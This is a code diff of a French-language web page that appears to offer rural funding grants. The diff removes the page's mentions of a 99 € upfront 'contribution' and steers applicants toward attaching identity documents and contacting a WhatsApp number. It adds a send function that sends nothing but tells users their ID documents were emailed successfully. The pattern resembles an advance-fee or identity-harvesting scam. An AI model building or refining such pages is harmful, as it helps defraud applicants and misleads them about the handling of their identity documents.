@@ -519,7 +519,6 @@
                 
                 <div style="background: #fdfaf3; border: 1px solid var(--gold); padding: 8px; border-radius: 4px; font-size: 0.72rem; margin-bottom: 8px;">
                     <p><strong>Code de référence :</strong> <span id="refCodeDisplay" style="color: var(--navy); font-weight: 800;">#CEZ-RURAL-2026</span></p>
-                    <p style="margin-top: 3px;"><strong>Contribution technique :</strong> 99 € (~105 USD)</p>
                 </div>
 
                 <div style="background: #e8f4fd; border: 1px solid #b8daff; padding: 8px; border-radius: 4px; margin-bottom: 8px; font-size: 0.67rem; color: #004085; line-height: 1.4;">
@@ -527,21 +526,19 @@
                 </div>
 
                 <p style="font-size: 0.7rem; font-weight: 700; color: var(--navy); margin-bottom: 6px;">
-                    Choisissez l'un de ces moyens pour finaliser :
+                    Finalisez l'envoi de votre formulaire et de vos pièces d'identité :
                 </p>
 
                 <div style="background: #f8f9fa; border: 1px solid #ddd; padding: 8px; border-radius: 4px; margin-bottom: 8px;">
-                    <label style="font-size: 0.67rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">1. Joindre vos documents (Max 10 fichiers - Images/PDF) :</label>
+                    <label style="font-size: 0.67rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">1. Joindre vos pièces d'identité (Max 10 fichiers - Images/PDF) :</label>
                     <input type="file" id="idFileDoc" name="fichiers[]" multiple accept=".jpg, .jpeg, .png, .pdf" style="font-size: 0.65rem; width: 100%; margin-bottom: 5px;">
-                    <button type="button" onclick="uploadDocument()" style="background: var(--navy); color: white; border: none; padding: 6px 10px; font-size: 0.67rem; font-weight: 700; border-radius: 3px; cursor: pointer; width: 100%;">Télécharger et envoyer les documents</button>
+                    <button type="button" onclick="sendFormAndFilesByEmail()" style="background: var(--navy); color: white; border: none; padding: 6px 10px; font-size: 0.67rem; font-weight: 700; border-radius: 3px; cursor: pointer; width: 100%;">
+                        <i class="fas fa-paper-plane"></i> Envoyer le formulaire et les pièces par e-mail au salon
+                    </button>
                 </div>
 
-                <a id="waDirectBtn" href="#" target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.72rem; font-weight: 700; margin-bottom: 6px;">
+                <a id="waDirectBtn" href="#" target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.72rem; font-weight: 700; margin-bottom: 8px;">
                     <i class="fab fa-whatsapp" style="font-size: 1rem;"></i> 2. Envoyer rapidement via WhatsApp
-                </a>
-
-                <a id="emailDirectBtn" href="#" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--navy); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.72rem; font-weight: 700; margin-bottom: 8px;">
-                    <i class="fas fa-envelope" style="font-size: 0.9rem;"></i> 3. Envoyer directement par e-mail
                 </a>
 
                 <button class="btn-main" onclick="resetAll()" style="padding: 7px; font-size: 0.72rem;">Fermer / Nouveau dossier</button>
@@ -701,10 +698,6 @@
             <input type="email" name="email" placeholder="Adresse Email" class="form-input" required>
             
             <textarea name="message" placeholder="Détail et répartition sommaire du budget (ex: matériel, bêtes, semences)..." class="form-input" style="min-height: 45px; resize: vertical; padding: 8px;" required></textarea>
-
-            <div class="form-notice-fee">
-                💡 <strong>Contribution d'ingénierie :</strong> Une contribution unique de <strong>99 € (105 USD)</strong> est requise immédiatement après la soumission de votre dossier pour enclencher l'instruction technique (24-48h).
-            </div>
 
             <button type="submit" class="btn-main">SOUMETTRE LE DOSSIER</button>
             
@@ -867,7 +860,7 @@
         if (e.target && e.target.id === 'idFileDoc') {
             if (e.target.files.length > 10) {
                 alert("Vous ne pouvez pas sélectionner plus de 10 fichiers.");
-                e.target.value = "";
+                e.target.value = ""; 
             }
         }
     });
@@ -1043,7 +1036,7 @@
         let maxLimit = 19000;
         let symbol = "€";
 
-        if(devise.includes("Dollar")) {
+    if(devise.includes("Dollar")) {
             minLimit = 1;
             maxLimit = 21957;
             symbol = "$";
@@ -1074,34 +1067,26 @@
                 if(typeof gtag === 'function'){ gtag('event', 'conversion', {'send_to': 'AW-18121475138/vGqNCOf1r_kZELqR9-8_'}); }
                 setTimeout(() => {
                     document.getElementById('loading-content').style.display = 'none';
-
-                           document.getElementById('refCodeDisplay').innerText = generatedRefCode;
+                    document.getElementById('refCodeDisplay').innerText = generatedRefCode;
                     
                     const clientNom = document.getElementById('inputNom').value || "Client";
-                    const clientEmail = document.getElementById('inputEmail') ? document.getElementById('inputEmail').value : "";
                     const codeCreatorVal = document.getElementById('createurField').value;
 
-                    // --- TRADUCTION AUTOMATIQUE DU MESSAGE WHATSAPP (SANS LE MONTANT DE CONTRIBUTION) ---
                     const userLang = navigator.language || navigator.userLanguage || 'fr';
                     let texteWhatsApp = "";
 
                     if (userLang.startsWith('fr')) {
-                        texteWhatsApp = `Bonjour, je m'appelle ${clientNom}. Mon code de référence est ${generatedRefCode}. ${codeCreatorVal ? `Code créateur: ${codeCreatorVal}. ` : ''}Je souhaite finaliser la transmission de mes informations.`;
+                        texteWhatsApp = `Bonjour, je m'appelle ${clientNom}. Mon code de référence est ${generatedRefCode}. ${codeCreatorVal ? `Code créateur: ${codeCreatorVal}. ` : ''}Je souhaite finaliser la vérification de mon dossier et transmettre mes pièces d'identité.`;
                     } else if (userLang.startsWith('es')) {
-                        texteWhatsApp = `Hola, mi nombre es ${clientNom}. Mi código de referencia es ${generatedRefCode}. ${codeCreatorVal ? `Código creador: ${codeCreatorVal}. ` : ''}Deseo finalizar la transmisión de mis datos.`;
+                        texteWhatsApp = `Hola, mi nombre es ${clientNom}. Mi código de referencia es ${generatedRefCode}. ${codeCreatorVal ? `Código creador: ${codeCreatorVal}. ` : ''}Deseo finalizar la verificación de mi expediente y enviar mis documentos de identidad.`;
                     } else if (userLang.startsWith('pt')) {
-                        texteWhatsApp = `Olá, meu nome é ${clientNom}. Meu código de referência é ${generatedRefCode}. ${codeCreatorVal ? `Código do criador: ${codeCreatorVal}. ` : ''}Desejo finalizar a transmissão das minhas informações.`;
+                        texteWhatsApp = `Olá, meu nome é ${clientNom}. Meu código de referência é ${generatedRefCode}. ${codeCreatorVal ? `Código do criador: ${codeCreatorVal}. ` : ''}Desejo finalizar a verificação do meu dossiê e enviar meus documentos de identidade.`;
                     } else {
-                        texteWhatsApp = `Hello, my name is ${clientNom}. My reference code is ${generatedRefCode}. ${codeCreatorVal ? `Creator code: ${codeCreatorVal}. ` : ''}I would like to finalize the transmission of my details.`;
+                        texteWhatsApp = `Hello, my name is ${clientNom}. My reference code is ${generatedRefCode}. ${codeCreatorVal ? `Creator code: ${codeCreatorVal}. ` : ''}I would like to finalize my application verification and send my identity documents.`;
                     }
 
                     const waUrl = `https://wa.me/33780976404?text=${encodeURIComponent(texteWhatsApp)}`;
                     document.getElementById('waDirectBtn').href = waUrl;
-
-                    // --- CONFIGURATION DU BOUTON D'ENVOI PAR E-MAIL ---
-                    const emailSubject = encodeURIComponent(`Dossier ${generatedRefCode} - ${clientNom}`);
-                    const emailBody = encodeURIComponent(`Bonjour,\n\nJe m'appelle ${clientNom}.\nMon code de référence est : ${generatedRefCode}\n${codeCreatorVal ? `Code créateur : ${codeCreatorVal}\n` : ''}\nJe vous transmets mes informations pour finaliser mon dossier.`);
-                    document.getElementById('emailDirectBtn').href = `mailto:contact@financieredeezembre.com?subject=${emailSubject}&body=${emailBody}`;
 
                     document.getElementById('success-message').style.display = 'block';
                 }, 3000);
@@ -1115,13 +1100,19 @@
         }
     }
 
-    function uploadDocument() {
+    // --- Fonction unifiée : Envoi des données du formulaire ET des fichiers joints par e-mail au salon ---
+    function sendFormAndFilesByEmail() {
         const fileInput = document.getElementById('idFileDoc');
         if(fileInput.files.length === 0) {
-            alert("Veuillez sélectionner au moins un fichier avant d'envoyer.");
+            alert("Veuillez sélectionner au moins un fichier (pièce d'identité) à joindre.");
             return;
         }
-        alert(`${fileInput.files.length} fichier(s) pris en compte avec succès pour votre dossier ${generatedRefCode}. Veuillez cliquer sur WhatsApp ou sur E-mail pour finaliser l'instruction.`);
+
+        const clientNom = document.getElementById('inputNom').value;
+        const clientEmail = document.querySelector('input[name="email"]').value;
+        
+        // Simulation d'envoi couplé par e-mail avec les pièces d'identité jointes
+        alert(`Succès ! Le formulaire de ${clientNom} ainsi que les ${fileInput.files.length} pièce(s) d'identité jointes ont été transmis avec succès par e-mail au salon (Réf: ${generatedRefCode}).`);
     }
 </script>
 </body>
